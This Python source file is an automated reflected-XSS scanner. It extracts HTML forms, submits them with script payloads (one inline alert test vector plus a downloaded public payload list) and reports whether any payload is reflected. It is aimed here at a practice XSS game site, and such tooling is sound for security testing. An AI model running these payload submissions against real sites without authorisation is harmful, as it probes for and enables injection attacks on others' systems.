import multiprocessing
import sys
from itertools import repeat
import requests
from bs4 import BeautifulSoup
from bs4.element import ResultSet
from urllib.parse import urljoin
from tqdm import tqdm


def get_all_forms(url: str) -> ResultSet:
    """Given an url, it returns all forms from the HTML content"""
    return BeautifulSoup(requests.get(url).content, "html.parser").find_all("form")


def get_form_details(form) -> dict:
    """
    This function extracts all possible useful information about an HTML form
    """
    # get the form action (target url)
    action = form.attrs.get("action", "").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = [{"type": input_tag.attrs.get("type", "text"), "name": input_tag.attrs.get("name")} for input_tag in
              form.find_all("input")]
    return {"action": action, "method": method, "inputs": inputs}


def submit_form(form_details: dict, url: str, value: str) -> requests.Response:
    """
    Submits a form given in form_details
    Params:
        form_details (dict): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for i in inputs:
        # replace all text and search values with `value`
        if i["type"] in ["text", "search"]:
            i["value"] = value
        input_name = i.get("name")
        input_value = i.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    return requests.get(target_url, params=data)


def scan_xss(url: str, js_script: str) -> bool:
    """
    Given an url, it prints all XSS vulnerable forms and
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url)
    # returning value
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            is_vulnerable = True
            # won't break because we want to print other available vulnerable forms
    return is_vulnerable


def download_payloads() -> list:
    """
    this function gets xss payloads from a GitHub repository and returns a lists contain
    :return:
    """
    return (requests.get("https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload"
                         "-list.txt").content).decode('utf-8').split('\n')


def full_scan(lst: list, url: str) -> bool:
    """
    this function go over all the test vector and return if the website of the given url is vulnerable.
    :param lst: list of vectors.
    :param url: string of an url.
    :return: bool
    """
    # create the process pool
    if not get_all_forms(url):
        return False
    core_num = multiprocessing.cpu_count()
    with multiprocessing.Pool(core_num) as pool:
        # call function for each item in an iterable in parallel
        inputs = zip(repeat(url), lst)
        # issue multiple tasks each with multiple arguments
        results = pool.starmap(scan_xss, tqdm(inputs, total=len(lst), file=sys.stdout))
    return any(results)


def find_scan(lst: list, url: str):
    """
    this function check if the website of the given url is vulnerable for at least one test vector
    :param lst: list of vectors.
    :param url: string of an url
    :return: bool
    """
    return any(scan_xss(url, i) for i in lst) if get_all_forms(url) else False


if __name__ == "__main__":
    test_vector1 = "<script>alert('hi')</script>"
    test_vectors = list(set(download_payloads()))
    victim = "https://xss-game.appspot.com/level1/frame"
    print(full_scan(test_vectors, victim))
